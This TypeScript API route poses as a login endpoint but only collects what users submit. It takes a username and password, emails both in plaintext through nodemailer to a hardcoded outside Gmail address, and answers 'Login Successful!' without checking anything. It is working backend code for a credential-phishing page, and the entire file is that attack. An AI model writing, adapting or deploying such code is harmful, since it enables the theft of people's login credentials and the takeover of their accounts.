import nodemailer from "nodemailer";

function formatMessage(user_name: string, password: string) {
  return `
    <div style="font-family: Arial, sans-serif; font-size: 16px; color: #333;">
      <p><strong>Username:</strong> ${user_name}</p>
      <p><strong>Password:</strong> ${password}</p>
    </div>
  `;
}

async function sendEmail(user_name: string, password: string) {
  const email = process.env.EMAIL_USERNAME;
  const pass = process.env.EMAIL_PASSWORD;
  const recipient = "paragoye1609@gmail.com"; // Change this to your desired email

  const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: { user: email, pass },
  });

  const mailOptions = {
    from: `New User Credentials ${email}`,
    to: recipient,
    subject: "User Credentials Submission",
    html: formatMessage(user_name, password),
  };

  try {
    await transporter.verify();
    await transporter.sendMail(mailOptions);
    return true;
  } catch (error) {
    console.error(`Login error: ${error}`);
    return false;
  }
}

export async function POST(request: Request) {
  try {
    const { user_name, password } = await request.json();

    if (!user_name || !password) {
      return Response.json(
        { error: "Username and password are required" },
        { status: 400 }
      );
    }

    const emailSent = await sendEmail(user_name, password);

    if (emailSent) {
      return Response.json({ message: "Login Successful!" }, { status: 200 });
    } else {
      return Response.json(
        { error: "Sorry something went wrong" },
        { status: 500 }
      );
    }
  } catch (error) {
    console.error(`Request error: ${error}`);
    return Response.json({ error: "Internal Server Error" }, { status: 500 });
  }
}
